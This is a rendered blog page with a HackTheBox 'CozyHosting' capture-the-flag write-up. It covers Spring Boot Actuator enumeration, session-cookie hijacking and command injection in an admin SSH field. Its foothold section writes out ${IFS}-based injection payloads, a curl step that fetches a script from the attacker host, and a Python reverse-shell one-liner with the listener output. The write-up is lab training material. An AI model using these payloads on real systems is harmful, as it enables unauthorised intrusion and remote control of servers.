@@ -1,0 +1,1233 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Cozy Hosting is an easy difficulty box utilizing an insecure configuration of Spring Boot. Unauthenticated users are able to view Actuator, listing all valid webpage paths. We are also able to view sessions, which logs all valid and invalid sessions and provides the associated session cookie. We can steal the session cookie from a valid user, and perform session hijacking to gain access. In the administrative panel, we can find a field vulnerable to command injeciton, given away rather clearly by verbose error messages. Once a remote connection is established, we can find postgres credentials in a .jar file and crack password hashes from the postgres database to log in as another user. With our new user access, we can exploit a SUID to root privileges through a simple look at GTFObins.">
+<title>HackTheBox - CozyHosting</title>
+
+<link rel='canonical' href='http://localhost:1313/p/hackthebox-cozyhosting/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="HackTheBox - CozyHosting">
+<meta property='og:description' content="Cozy Hosting is an easy difficulty box utilizing an insecure configuration of Spring Boot. Unauthenticated users are able to view Actuator, listing all valid webpage paths. We are also able to view sessions, which logs all valid and invalid sessions and provides the associated session cookie. We can steal the session cookie from a valid user, and perform session hijacking to gain access. In the administrative panel, we can find a field vulnerable to command injeciton, given away rather clearly by verbose error messages. Once a remote connection is established, we can find postgres credentials in a .jar file and crack password hashes from the postgres database to log in as another user. With our new user access, we can exploit a SUID to root privileges through a simple look at GTFObins.">
+<meta property='og:url' content='http://localhost:1313/p/hackthebox-cozyhosting/'>
+<meta property='og:site_name' content='Spencer&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Command Injection' /><meta property='article:tag' content='Spring Boot' /><meta property='article:tag' content='Session Hijack' /><meta property='article:tag' content='ssh' /><meta property='article:tag' content='postgres' /><meta property='article:tag' content='java' /><meta property='article:published_time' content='2024-03-02T00:54:16-06:00'/><meta property='article:modified_time' content='2024-03-02T00:54:16-06:00'/><meta property='og:image' content='http://localhost:1313/p/hackthebox-cozyhosting/CozyHosting.png' />
+<meta name="twitter:title" content="HackTheBox - CozyHosting">
+<meta name="twitter:description" content="Cozy Hosting is an easy difficulty box utilizing an insecure configuration of Spring Boot. Unauthenticated users are able to view Actuator, listing all valid webpage paths. We are also able to view sessions, which logs all valid and invalid sessions and provides the associated session cookie. We can steal the session cookie from a valid user, and perform session hijacking to gain access. In the administrative panel, we can find a field vulnerable to command injeciton, given away rather clearly by verbose error messages. Once a remote connection is established, we can find postgres credentials in a .jar file and crack password hashes from the postgres database to log in as another user. With our new user access, we can exploit a SUID to root privileges through a simple look at GTFObins."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/p/hackthebox-cozyhosting/CozyHosting.png' />
+    <link rel="shortcut icon" href="/favicon.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu897059592634026878.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
+            <h2 class="site-description">Lorem ipsum dolor sit amet, consectetur adipiscing elit.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/post' >
+                
+                
+                
+                <span>Posts</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/awards' >
+                
+                
+                
+                <span>Trophy Room</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#enumeration">Enumeration</a>
+      <ol>
+        <li><a href="#exploring-webpage">Exploring webpage</a></li>
+        <li><a href="#viewing-valid-cookie-sessions-and-session-hijacking">Viewing valid cookie sessions and session hijacking</a></li>
+      </ol>
+    </li>
+    <li><a href="#foothold">Foothold</a>
+      <ol>
+        <li><a href="#rce-via-command-injection">RCE via command injection</a></li>
+        <li><a href="#user-enumeration">User Enumeration</a></li>
+        <li><a href="#cracking-password-hashes-from-postgres-database">Cracking password hashes from postgres database</a></li>
+      </ol>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ol>
+        <li><a href="#gtfobins-on-suid">GTFOBins on SUID</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/hackthebox-cozyhosting/">
+                <img src="/p/hackthebox-cozyhosting/CozyHosting_hu2401193653850162788.png"
+                        srcset="/p/hackthebox-cozyhosting/CozyHosting_hu2401193653850162788.png 800w, /p/hackthebox-cozyhosting/CozyHosting_hu2102099281586416038.png 1600w"
+                        width="800" 
+                        height="606" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - CozyHosting" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hack-the-box/" >
+                Hack the Box
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/hackthebox-cozyhosting/">HackTheBox - CozyHosting</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Cozy Hosting is an easy difficulty box utilizing an insecure configuration of Spring Boot. Unauthenticated users are able to view Actuator, listing all valid webpage paths. We are also able to view sessions, which logs all valid and invalid sessions and provides the associated session cookie. We can steal the session cookie from a valid user, and perform session hijacking to gain access. In the administrative panel, we can find a field vulnerable to command injeciton, given away rather clearly by verbose error messages. Once a remote connection is established, we can find postgres credentials in a .jar file and crack password hashes from the postgres database to log in as another user. With our new user access, we can exploit a SUID to root privileges through a simple look at GTFObins.
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 02, 2024</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    7 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="enumeration">Enumeration
+</h2><p>Initial nmap:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-02 3:11 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report for 10.129.105.187
+</span></span><span class="line"><span class="cl">Host is up (0.051s latency).
+</span></span><span class="line"><span class="cl">Not shown: 998 closed tcp ports (conn-refused)
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.18.0 (Ubuntu)
+</span></span><span class="line"><span class="cl">|_http-server-header: nginx/1.18.0 (Ubuntu)
+</span></span><span class="line"><span class="cl">|_http-title: Did not follow redirect to http://cozyhosting.htb
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 9.35 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>When visiting the port 80 website, we are redirected to <code>cozyhosting.htb</code>. Adding this to our /etc/hosts file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">10.129.105.187 cozyhosting.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="exploring-webpage">Exploring webpage
+</h3><p>Viewing the webpage, there is not much more than a login page:</p>
+<p><img src="/p/hackthebox-cozyhosting/Images/Login.png"
+	width="493"
+	height="445"
+	srcset="/p/hackthebox-cozyhosting/Images/Login_hu15979691286598923830.png 480w, /p/hackthebox-cozyhosting/Images/Login_hu14738137404947921595.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="110"
+		data-flex-basis="265px"
+	
+></p>
+<p>Trying generic logins such as <code>admin:password</code> fail, and fuzzing for subdomains or hidden webpages does not yield much. When we take a look at the error message, though, we can glean a little information about the backend:</p>
+<p><img src="/p/hackthebox-cozyhosting/Images/errorpage.png"
+	width="766"
+	height="218"
+	srcset="/p/hackthebox-cozyhosting/Images/errorpage_hu3973605124121712055.png 480w, /p/hackthebox-cozyhosting/Images/errorpage_hu2117736812089126104.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="351"
+		data-flex-basis="843px"
+	
+></p>
+<p>When we google search this Whitelabel Error Page, it returns information on Spring. Eventually, I think to fuzz for pages again, this time using a spring-boot wordlist:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ feroxbuster -u http://cozyhosting.htb/ -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">http://cozyhosting.htb/actuator/env/spring.jmx.enabled
+</span></span><span class="line"><span class="cl">200      GET        1l        1w      498c http://cozyhosting.htb/actuator/sessions
+</span></span><span class="line"><span class="cl">200      GET       83l      453w    36234c http://cozyhosting.htb/assets/img/values-3.png
+</span></span><span class="line"><span class="cl">200      GET        1l        1w      634c http://cozyhosting.htb/actuator
+</span></span><span class="line"><span class="cl">200      GET        1l        1w       15c http://cozyhosting.htb/actuator/health
+</span></span><span class="line"><span class="cl">200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/path
+</span></span><span class="line"><span class="cl">200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/lang
+</span></span><span class="line"><span class="cl">200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/home
+</span></span><span class="line"><span class="cl">200      GET       73l      470w    37464c http://cozyhosting.htb/assets/img/values-1.png
+</span></span><span class="line"><span class="cl">200      GET        1l      218w    26053c http://cozyhosting.htb/assets/vendor/aos/aos.css
+</span></span><span class="line"><span class="cl">200      GET        1l      120w     4957c http://cozyhosting.htb/actuator/env
+</span></span><span class="line"><span class="cl">200      GET        1l      313w    14690c http://cozyhosting.htb/assets/vendor/aos/aos.js
+</span></span><span class="line"><span class="cl">200      GET       79l      519w    40905c http://cozyhosting.htb/assets/img/values-2.png
+</span></span><span class="line"><span class="cl">200      GET        1l      108w     9938c http://cozyhosting.htb/actuator/mappings
+</span></span><span class="line"><span class="cl">200      GET        1l      625w    55880c http://cozyhosting.htb/assets/vendor/glightbox/js/glightbox.min.js
+</span></span><span class="line"><span class="cl">200      GET     2018l    10020w    95609c http://cozyhosting.htb/assets/vendor/bootstrap-icons/bootstrap-icons.css
+</span></span><span class="line"><span class="cl">200      GET        7l     1222w    80420c http://cozyhosting.htb/assets/vendor/bootstrap/js/bootstrap.bundle.min.js
+</span></span><span class="line"><span class="cl">200      GET     2397l     4846w    42231c http://cozyhosting.htb/assets/css/style.css
+</span></span><span class="line"><span class="cl">200      GET       14l     1684w   143706c http://cozyhosting.htb/assets/vendor/swiper/swiper-bundle.min.js
+</span></span><span class="line"><span class="cl">200      GET        1l      542w   127224c http://cozyhosting.htb/actuator/beans
+</span></span><span class="line"><span class="cl">200      GET        7l     2189w   194901c http://cozyhosting.htb/assets/vendor/bootstrap/css/bootstrap.min.css
+</span></span><span class="line"><span class="cl">200      GET      285l      745w    12706c http://cozyhosting.htb/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Actuator is a new result, and viewing actuator is quite interesting:</p>
+<p><img src="/p/hackthebox-cozyhosting/Images/Actuator.png"
+	width="524"
+	height="591"
+	srcset="/p/hackthebox-cozyhosting/Images/Actuator_hu7576475171154501233.png 480w, /p/hackthebox-cozyhosting/Images/Actuator_hu9174783063628228070.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="88"
+		data-flex-basis="212px"
+	
+></p>
+<h3 id="viewing-valid-cookie-sessions-and-session-hijacking">Viewing valid cookie sessions and session hijacking
+</h3><p>Looking at sessions, we can see all sessions, including the cookie and associated authentication. Among the list, there is a valid session for a certain user:</p>
+<p><img src="/p/hackthebox-cozyhosting/Images/sessions.png"
+	width="642"
+	height="298"
+	srcset="/p/hackthebox-cozyhosting/Images/sessions_hu17929760529154617793.png 480w, /p/hackthebox-cozyhosting/Images/sessions_hu8620538350017015014.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="215"
+		data-flex-basis="517px"
+	
+></p>
+<p><code>kanderson</code> is a user. We might be able to brute force the login, but for now we can just steal his cookie</p>
+<p>In firefox inspect, we substitute JSESSIONID value with kanderson&rsquo;s:</p>
+<p><img src="/p/hackthebox-cozyhosting/Images/cookie.png"
+	width="841"
+	height="197"
+	srcset="/p/hackthebox-cozyhosting/Images/cookie_hu15257699291229082169.png 480w, /p/hackthebox-cozyhosting/Images/cookie_hu9377202297078364797.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="426"
+		data-flex-basis="1024px"
+	
+></p>
+<p>Now we can visit <code>cozyhosting.htb/admin</code>.</p>
+<p>The page itself does not have much to go on, but there does seem to be a remote connection component that is worth exploring:</p>
+<p><img src="/p/hackthebox-cozyhosting/Images/automatic_patching.png"
+	width="1476"
+	height="420"
+	srcset="/p/hackthebox-cozyhosting/Images/automatic_patching_hu2880599473690978880.png 480w, /p/hackthebox-cozyhosting/Images/automatic_patching_hu2564565214237495984.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="351"
+		data-flex-basis="843px"
+	
+></p>
+<p>Interestingly, ssh connection attempt does not reach my box despite listening on port 22</p>
+<p><img src="/p/hackthebox-cozyhosting/Images/timeout.png"
+	width="531"
+	height="119"
+	srcset="/p/hackthebox-cozyhosting/Images/timeout_hu13233095329045554426.png 480w, /p/hackthebox-cozyhosting/Images/timeout_hu11233246785537511088.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="446"
+		data-flex-basis="1070px"
+	
+></p>
+<p>Even more interesting is the error received when submitting a break:</p>
+<p><img src="/p/hackthebox-cozyhosting/Images/break.png"
+	width="297"
+	height="163"
+	srcset="/p/hackthebox-cozyhosting/Images/break_hu8505258441731976925.png 480w, /p/hackthebox-cozyhosting/Images/break_hu9505050750584736290.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="182"
+		data-flex-basis="437px"
+	
+>
+In the url response:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://cozyhosting.htb/admin?error=usage:%20ssh%20[-46AaCfGgKkMNnqsTtVvXxYy]%20[-B%20bind_interface]%20%20%20%20%20%20%20%20%20%20%20[-b%20bind_address]%20[-c%20cipher_spec]%20[-D%20[bind_address:]port]%20%20%20%20%20%20%20%20%20%20%20[-E%20log_file]%20[-e%20escape_char]%20[-F%20configfile]%20[-I%20pkcs11]%20%20%20%20%20%20%20%20%20%20%20[-i%20identity_file]%20[-J%20[user@]host[:port]]%20[-L%20address]%20%20%20%20%20%20%20%20%20%20%20[-l%20login_name]%20[-m%20mac_spec]%20[-O%20ctl_cmd]%20[-o%20option]%20[-p%20port]%20%20%20%20%20%20%20%20%20%20%20[-Q%20query_option]%20[-R%20address]%20[-S%20ctl_path]%20[-W%20host:port]%20%20%20%20%20%20%20%20%20%20%20[-w%20local_tun[:remote_tun]]%20destination%20[command%20[argument%20...]]/bin/bash:%20line%201:%20@127.0.0.1:%20command%20not%20found
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="foothold">Foothold
+</h2><h3 id="rce-via-command-injection">RCE via command injection
+</h3><p>This error matches what we would expect when performing an invalid <code>ssh</code> operation in a shell session, suggesting the command is run as some sort of shell execute. Perhaps we can abuse this to achieve remote code execution?</p>
+<p>One small problem, there is no witespace allowed in username field:</p>
+<p><img src="/p/hackthebox-cozyhosting/Images/whitespace.png"
+	width="732"
+	height="283"
+	srcset="/p/hackthebox-cozyhosting/Images/whitespace_hu1174614228290478445.png 480w, /p/hackthebox-cozyhosting/Images/whitespace_hu11147208042808419728.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="258"
+		data-flex-basis="620px"
+	
+></p>
+<p>We have a way to avoid this, by utilizing <code>${IFS}</code>. In bash, this is treated as a space, and can be utilized to bypass the whitespace filter if it is indeed executed as shell command.</p>
+<p>Using ${IFS} to curl:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">kali@10.10.14.134;curl${IFS}10.10.14.134;#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On our attacker machine:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ nc -nvlp 80
+</span></span><span class="line"><span class="cl">listening on [any] 80 ...
+</span></span><span class="line"><span class="cl">connect to [10.10.14.134] from (UNKNOWN) [10.129.105.187] 46286
+</span></span><span class="line"><span class="cl">GET / HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 10.10.14.134
+</span></span><span class="line"><span class="cl">User-Agent: curl/7.81.0
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We have a hit! So now, hopefully we can supply a rev shell 1 liner and get a reverse shell!</p>
+<p>After struggling with reverse shells for a while, I finally got a working solution. Generate rev.py on kali machine:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cat rev.py          
+</span></span><span class="line"><span class="cl">import os,pty,socket;s=socket.socket();s.connect((&#34;10.10.14.134&#34;,8888));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&#34;/bin/bash&#34;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Pick it up with curl command on server:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">kali@10.10.14.134;curl${IFS}10.10.14.134/rev.py${IFS}-o${IFS}/tmp/rev.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>on my kali, python server:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ python -m http.server 80
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</span></span><span class="line"><span class="cl">10.129.105.187 - - [03/Sep/2023 00:29:36] &#34;GET /rev.py HTTP/1.1&#34; 200 -
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Finally, launch the python script once again in the username box:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">kali@10.10.14.134;python3${IFS}/tmp/rev.py;#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>meanwhile on my listener:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ nc -vnlp 8888
+</span></span><span class="line"><span class="cl">listening on [any] 8888 ...
+</span></span><span class="line"><span class="cl">connect to [10.10.14.134] from (UNKNOWN) [10.129.105.187] 47932
+</span></span><span class="line"><span class="cl">app@cozyhosting:/app$ whoami
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">app
+</span></span><span class="line"><span class="cl">app@cozyhosting:/app$
+</span></span></code></pre></td></tr></table>
+</div>
